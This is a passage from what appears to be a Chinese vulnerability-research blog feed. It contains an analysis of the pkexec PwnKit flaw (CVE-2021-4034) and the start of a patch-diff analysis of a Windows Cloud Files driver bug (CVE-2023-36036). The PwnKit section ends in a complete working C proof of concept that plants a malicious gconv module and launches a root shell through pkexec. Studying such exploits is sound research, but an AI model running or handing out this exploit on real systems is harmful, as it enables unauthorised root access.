style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">__rawmemchr</span> (cp,<span style="color:#e6db74">'\0'</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>unsecure_envvars定义在<a href="https://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html" target="_blank">https://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html</a>这些环境变量能够引入外部so，从而在执行程序的时候执行恶意代码，这在执行suid程序时是不安全的，所以glibc在初始化时就将这些环境变量去除了除非程序主动setenv。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define UNSECURE_ENVVARS \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "GCONV_PATH\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "GETCONF_DIR\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> GLIBC_TUNABLES_ENVVAR \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "HOSTALIASES\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_AUDIT\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_DEBUG\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_DEBUG_OUTPUT\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_DYNAMIC_WEAK\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_HWCAP_MASK\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_LIBRARY_PATH\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_ORIGIN_PATH\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_PRELOAD\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_PROFILE\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_SHOW_AUXV\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LD_USE_LOAD_BIAS\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LOCALDOMAIN\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "LOCPATH\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "MALLOC_TRACE\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "NIS_PATH\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "NLSPATH\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "RESOLV_HOST_CONF\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "RES_OPTIONS\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "TMPDIR\0" \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> "TZDIR\0"</span></span></span></code></pre></div><p>如何触发加载，代码中有如下在循环中会遍历<code>environment_variables_to_save</code>并获取对应的环境变量的值，传入到<code>validate_environment_variable</code>函数中。<code>validate_environment_variable</code>函数会验证SHELL和XAUTHORITY环境变量是否合法，当SHELL环境变量不属于/etc/shells中的任意一个则会调用<code>g_printerr</code>，或者XAUTHORITY环境变量中包含<code>%</code>或<code>..</code>也会调用g_printerr</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> gchar<span style="color:#f92672">*</span>environment_variables_to_save[]<span style="color:#f92672">=</span> {</span></span><span style="display:flex;"><span><span style="color:#e6db74">"SHELL"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LANG"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LINGUAS"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LANGUAGE"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LC_COLLATE"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LC_CTYPE"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LC_MESSAGES"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LC_MONETARY"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LC_NUMERIC"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LC_TIME"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"LC_ALL"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"TERM"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"COLORTERM"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"DISPLAY"</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"XAUTHORITY"</span>,</span></span><span style="display:flex;"><span> NULL</span></span><span style="display:flex;"><span> };</span></span><span style="display:flex;"><span> saved_env<span style="color:#f92672">=</span><span style="color:#a6e22e">g_ptr_array_new</span> ();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (n<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; environment_variables_to_save[n]<span style="color:#f92672">!=</span> NULL; n<span style="color:#f92672">++</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> gchar<span style="color:#f92672">*</span>key<span style="color:#f92672">=</span> environment_variables_to_save[n];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> gchar<span style="color:#f92672">*</span>value;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> value<span style="color:#f92672">=</span><span style="color:#a6e22e">g_getenv</span> (key);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (value<span style="color:#f92672">==</span> NULL)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">continue</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* To qualify for the paranoia goldstar - we validate the value of each</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * environment variable passed through - this is to attempt to avoid</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * exploits in (potentially broken) programs launched via pkexec(1).</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">validate_environment_variable</span> (key, value))</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> out;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">g_ptr_array_add</span> (saved_env,<span style="color:#a6e22e">g_strdup</span> (key));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">g_ptr_array_add</span> (saved_env,<span style="color:#a6e22e">g_strdup</span> (value));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">validate_environment_variable</span> (<span style="color:#66d9ef">const</span> gchar<span style="color:#f92672">*</span>key,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> gchar<span style="color:#f92672">*</span>value)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> gboolean ret;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* Generally we bail if any environment variable value contains</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * - '/' characters</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * - '%' characters</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * - '..' substrings</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">g_return_val_if_fail</span> (key<span style="color:#f92672">!=</span> NULL, FALSE);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">g_return_val_if_fail</span> (value<span style="color:#f92672">!=</span> NULL, FALSE);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ret<span style="color:#f92672">=</span> FALSE;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* special case $SHELL */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">g_strcmp0</span> (key,<span style="color:#e6db74">"SHELL"</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#75715e">/* check if it's in /etc/shells */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_valid_shell</span> (value))</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log_message</span> (LOG_CRIT, TRUE,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"The value for the SHELL variable was not found the /etc/shells file"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">g_printerr</span> (<span style="color:#e6db74">"</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"This incident has been reported.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> out;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">g_strcmp0</span> (key,<span style="color:#e6db74">"XAUTHORITY"</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">strstr</span> (value,<span style="color:#e6db74">"/"</span>)<span style="color:#f92672">!=</span> NULL)<span style="color:#f92672">||</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">strstr</span> (value,<span style="color:#e6db74">"%"</span>)<span style="color:#f92672">!=</span> NULL<span style="color:#f92672">||</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">strstr</span> (value,<span style="color:#e6db74">".."</span>)<span style="color:#f92672">!=</span> NULL)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log_message</span> (LOG_CRIT, TRUE,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"The value for environment variable %s contains suscipious content"</span>,</span></span><span style="display:flex;"><span> key);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">g_printerr</span> (<span style="color:#e6db74">"</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"This incident has been reported.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> out;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ret<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> out:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ret;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><code>/etc/shells</code>文件内容如下：</p><pre tabindex="0"><code>➜ c cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/pwsh
/opt/microsoft/powershell/7/pwsh
/usr/bin/tmux
/usr/bin/screen
/bin/zsh
/usr/bin/zsh
/usr/bin/zsh</code></pre><p><strong>触发路径</strong></p><p>当CHARSET环境变量不是UTF-8时，g_printerr不能正确打印错误消息到stderr，为了将错误消息转化为其他字符集，g_printerr会调用iconv_open()，iconv_open()会执行共享库，并且读取默认配置文件/usr/lib/gconv/gconv-modules，当GCONV_PATH环境变量存在时，可以强制iconv_open()使用GCONV_PATH指向的目录中读取gconv-modules配置文件。</p><p>因此利用可以构造如下环境变量，在通过execve启动时，pwnkit会传递给<code>g_find_program_in_path</code>函数，尝试在PATH指向的目录中寻找名为pwnkit的可执行程序，此时会找到<code>GCONV_PATH=./pwnkit</code>，并将其赋值给<code>argv[1]</code>实际上是<code>envp[0]</code>向pkexec注入了一个环境变量。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>env[]<span style="color:#f92672">=</span> {<span style="color:#e6db74">"pwnkit"</span>,<span style="color:#e6db74">"PATH=GCONV_PATH=."</span>,<span style="color:#e6db74">"CHARSET=PWNKIT"</span>,<span style="color:#e6db74">"SHELL=pwnkit"</span>, NULL };</span></span></code></pre></div><p>而后由于CHARSET不是UTF-8，在SHELL触发g_printerr，g_printerr会调用iconv_open()函数，由于注入了环境变量GCONV_PATH，iconv_open函数会尝试在GCONV_PATH指向的目录，即./pwnkit目录下读取gconv-modules文件，此时./pwnkit/gconv-modules已经被覆盖为如下内容：</p><pre tabindex="0"><code>module UTF-8// PWNKIT// pwnkit 1</code></pre><p>这个配置文件指示iconv_open()，当尝试从UTF-8向PWNKIT转换时应该加载pwnkit.so，而CHARSET即目标字符集已经被设置为PWNKIT，所以会尝试加载pwnkit.so，只需要使我们的so在pwnkit/pwnkit.so目录即可使得pkexec以root权限加载我们的恶意so，达成提权。</p><p><strong>漏洞修复</strong></p><p>前面分析知道触发漏洞需要argc=0，所以在程序启动时监测argc&lt;1就直接退出了</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (argc<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">1</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">127</span>);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unistd.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>shell<span style="color:#f92672">=</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"#include &lt;stdio.h></span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"#include &lt;stdlib.h></span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"#include &lt;unistd.h></span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"void gconv() {}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"void gconv_init() {</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">" setuid(0); setgid(0);</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">" seteuid(0); setegid(0);</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">" system(</span><span style="color:#ae81ff">\"</span><span style="color:#e6db74">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; /bin/sh</span><span style="color:#ae81ff">\"</span><span style="color:#e6db74">);</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">" exit(0);</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"}"</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>argv[]) {</span></span><span style="display:flex;"><span> FILE<span style="color:#f92672">*</span>fp;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules"</span>);</span></span><span style="display:flex;"><span> fp<span style="color:#f92672">=</span><span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">"pwnkit/pwnkit.c"</span>,<span style="color:#e6db74">"w"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fprintf</span>(fp,<span style="color:#e6db74">"%s"</span>, shell);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>(fp);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>env[]<span style="color:#f92672">=</span> {<span style="color:#e6db74">"pwnkit"</span>,<span style="color:#e6db74">"PATH=GCONV_PATH=."</span>,<span style="color:#e6db74">"CHARSET=PWNKIT"</span>,<span style="color:#e6db74">"SHELL=pwnkit"</span>, NULL };</span></span><span style="display:flex;"><span><span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">"./pkexec_105"</span>, (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>[]){NULL}, env);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="小结">小结</h3><p>这个漏洞虽然是溢出漏洞，但更类似于逻辑漏洞，不需要为特定操作系统进行布局，只需要构造恶意环境变量组即可注入恶意环境变量，整体利用较为简单。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://xz.aliyun.com/t/10870" target="_blank">https://xz.aliyun.com/t/10870</a></p><p><a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank">https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</a></p></blockquote><p><strong>Created at 2023-11-30T14:25:08+08:00</strong></p></description></item><item><title>CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/</link><pubDate>Fri, 24 Nov 2023 15:49:32 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/</guid><description><h3 id="基本信息">基本信息</h3><p>Windows Cloud Files Mini Filter 驱动中存在越界写入漏洞，在解析Reparse point数据时，由于memcpy函数的长度参数用户可控，源内存可控，导致攻击者可以构造恶意结构并传递给Windows Cloud Files Mini Filter 驱动，造成越界写入，并在内核执行任意代码。</p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>Windows 10 23年10月补丁</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p>cldflt.sys驱动中实现了云文件的各项功能，diff该驱动，修改函数如下：</p><p><img alt="" src="/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/1.png"/></p><p>在<code>HsmpRpiDecompressBuffer</code>函数中有如下修改，对<code>*(_WORD *)(a1 + 10)</code>添加了一个判断，是否<code>>0x4000</code>，</p><p><img alt="" src="/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/2.png"/></p><p>如果大于则抛出错误<code>0xC000CF02</code>对应<code>STATUS_CLOUD_FILE_METADATA_CORRUPT</code></p><blockquote><p><a href="https://endodermis59.rssing.com/chan-36587470/all_p6.html" target="_blank">https://endodermis59.rssing.com/chan-36587470/all_p6.html</a></p></blockquote><p>AI输出</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>HsmpRpiDecompressBuffer函数的作用是解压压缩后的Reparse Point数据。</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>主要功能包括:</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1. 校验传入数据的完整性和魔数是否正确</span></span><span style="display:flex;"><span>2. 如果数据被压缩,则根据原长度分配解压缓冲区</span></span><span style="display:flex;"><span>3. 调用RtlDecompressBuffer进行实际解压</span></span><span style="display:flex;"><span>4. 检查解压后数据长度是否匹配</span></span><span style="display:flex;"><span>5. 如果解压成功,返回解压后的数据</span></span><span style="display:flex;"><span>6. 否则返回错误码</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>所以它是一个典型的压缩数据解压函数,接收原始压缩数据,校验->分配缓冲区->解压->返回解压后数据的过程。</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>通过解压让后续代码可以处理未压缩的Reparse Point数据,一般在需要提交/更新数据时会解压。</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>主要作用就是将压缩后的Reparse Point还原为可读的未压缩数据。</span></span></code></pre></div><p><code>HsmpRpiDecompressBuffer</code>由<code>HsmpRpReadBuffer</code>调用</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">HsmpRpReadBuffer</span>(PFLT_INSTANCE Instance, PFILE_OBJECT FileObject,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">**</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>...</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span>;</span></span><span style="display:flex;"><span> OutputBuffer<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(PagedPool,<span style="color:#ae81ff">0x400u</span>i64,<span style="color:#ae81ff">0x70527348u</span>);</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span> OutputBuffer;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v9)<span style="color:#f92672">=</span><span style="color:#a6e22e">HsmpRpiDecompressBuffer</span>((<span style="color:#66d9ef">__int64</span>)v8, v6, a3);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HsmDbgBreakOnStatus</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> WPP_GLOBAL_Control;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">==</span> (PDEVICE_OBJECT)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (<span style="color:#a6e22e">HIDWORD</span>(WPP_GLOBAL_Control<span style="color:#f92672">-></span>Timer)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#a6e22e">BYTE1</span>(WPP_GLOBAL_Control<span style="color:#f92672">-></span>Timer)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_8;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_30;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>a3<span style="color:#f92672">!=</span> v8 )</span></span><span style="display:flex;"><span>LABEL_8:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExFreePoolWithTag</span>(v8,<span style="color:#ae81ff">0x70527348u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>AI解释</p><pre tabindex="0"><code>这段代码实现了解析和解压Reparse Point数据的功能:
1. 分配OutputBuffer内存用于读取Reparse数据。
2. 调用FltFsControlFile读取Reparse数据到OutputBuffer。
3. 如果读取失败,并且错误码表示buffer太小,则重新分配更大的buffer并重试读取。
4. 调用HsmpRpiDecompressBuffer对读取到的数据进行解压。
5. 如果解压成功,返回解压后的数据,否则返回错误码。
6. 释放原始数据内存。
7. 其中包含了详细的错误和日志记录逻辑。
所以总的来说,这段代码用于从文件系统读取Reparse Point数据,然后对数据进行解压和解析,最后返回解析后的数据。
主要功能聚焦在读取压缩数据并解压这块。</code></pre><p><code>HsmpRpReadBuffer</code>由<code>HsmpRpCommitNoLock</code>和<code>HsmpSetupContexts</code>调用。</p><p><code>HsmpRpCommitNoLock</code>解释如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>这个C函数实现了HsmpRpCommitNoLock,它似乎是用于在没有锁的情况下提交页面重播(Page Replay)数据。</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>主要的逻辑如下:</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1. 校验和准备输入数据</span></span><span style="display:flex;"><span>2. 分配内存池来存储提交的数据</span></span><span style="display:flex;"><span>3. 构建数据结构,填充各种元数据</span></span><span style="display:flex;"><span>4. 尝试压缩数据</span></span><span style="display:flex;"><span>5. 将数据写入文件</span></span><span style="display:flex;"><span>6. 清理临时数据结构和内存</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>具体来说,这个函数做了以下工作:</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1. 验证输入参数的有效性</span></span><span style="display:flex;"><span>2. 为输出缓冲区分配内存</span></span><span style="display:flex;"><span>3. 构建输出缓冲区的数据结构</span></span><span style="display:flex;"><span>4. 填充输出缓冲区的头部</span></span><span style="display:flex;"><span>5. 将输入缓冲区的数据复制到输出缓冲区</span></span><span style="display:flex;"><span>6. 计算校验和</span></span><span style="display:flex;"><span>7. 尝试压缩输出缓冲区</span></span><span style="display:flex;"><span>8. 标记文件属性</span></span><span style="display:flex;"><span>9. 将输出缓冲区的数据写入文件</span></span><span style="display:flex;"><span>10. 重置文件属性</span></span><span style="display:flex;"><span>11. 释放临时缓冲区和内存</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>所以总的来说,这个函数的主要目的是准备并提交页面重播数据,同时处理必要的校验、压缩和清理工作。</span></span></code></pre></div><p>在<code>HsmpRpCommitNoLock</code>中有如下代码，可以看到在前面diff中出现的0x4000和0x3FFC，可以猜测漏洞产生于该函数中</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>LABEL_156:</span></span><span style="display:flex;"><span> PoolWithTag<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(PagedPool,<span style="color:#ae81ff">0x4000u</span>i64,<span style="color:#ae81ff">0x70527348u</span>);</span></span><span style="display:flex;"><span> v142<span style="color:#f92672">=</span> PoolWithTag;</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)PoolWithTag;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( PoolWithTag )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(PoolWithTag,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x4000u</span>i64);</span></span><span style="display:flex;"><span> v57<span style="color:#f92672">=</span> InputBuffer;</span></span><span 